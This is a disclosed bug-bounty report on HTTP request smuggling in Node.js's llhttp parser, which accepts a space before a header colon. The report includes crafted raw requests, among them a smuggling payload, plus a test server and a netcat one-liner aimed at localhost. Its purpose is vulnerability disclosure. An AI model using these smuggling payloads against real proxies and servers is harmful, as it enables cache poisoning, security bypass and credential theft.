# HTTP Request Smuggling due to accepting space before colon

## Report Details
- **Report ID**: 1238709
- **URL**: https://hackerone.com/reports/1238709
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-20T11:10:00.909Z
- **Disclosed**: 2021-10-20T14:58:11.063Z

## Reporter
- **Username**: mkg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**
The ``llhttp`` parser in the ``http``module in Node 16.3.0 accepts requests with a space (SP) right after the header name before the colon. This can lead to HTTP Request Smuggling (HRS).

**Description:**
When Node receives the following request:

```
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 5

hello
```

It interprets the request as having the body `hello`. Here is the relevant section of the code: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L410-L415

How could this lead to HRS? Imagine that Node is placed behind a proxy which ignores the CL header with a space before the colon, but forwards it as is. Then the following attack can be performed:

```
GET / HTTP/1.1
Host: localhost:5000
Content-Length : 23

GET / HTTP/1.1
Dummy: GET /smuggled HTTP/1.1
Host: localhost:5000

```

The proxy would see the first and the second GET-request. But Node would see the first and the third GET-request.

## Steps To Reproduce:

We don't know of any proxy that behaves this way, but here is how to show that Node is behaving in the described way. Run the following code like this: `node app.js`

```js
const http = require('http');

// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/

http.createServer((request, response) => {
  let body = [];
  request.on('error', (err) => {
    response.end("error while reading body: " + err)
}).on('data', (chunk) => {
    body.push(chunk);
}).on('end', () => {
    body = Buffer.concat(body).toString();

    response.on('error', (err) => {
        response.end("error while sending response: " + err)
    });

    response.end("Body length: " + body.length.toString() + " Body: " + body);
  });
}).listen(5000);
```

Then send a request with a space between the CL header and the colon. This can be done with the following one-liner:

```sh
echo -en "GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello" | nc localhost 5000
```

See that Node interpreted the body as `hello`.

# Supporting Material/References:

Relevant section of RFC 7230 (second paragraph of https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4):

```
   No whitespace is allowed between the header field-name and colon.  In
   the past, differences in the handling of such whitespace have led to
   security vulnerabilities in request routing and response handling.  A
   server MUST reject any received request message that contains
   whitespace between a header field-name and colon with a response code
   of 400 (Bad Request).  A proxy MUST remove any such whitespace from a
   response message before forwarding the message downstream.
```

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

## Attachments
No attachments
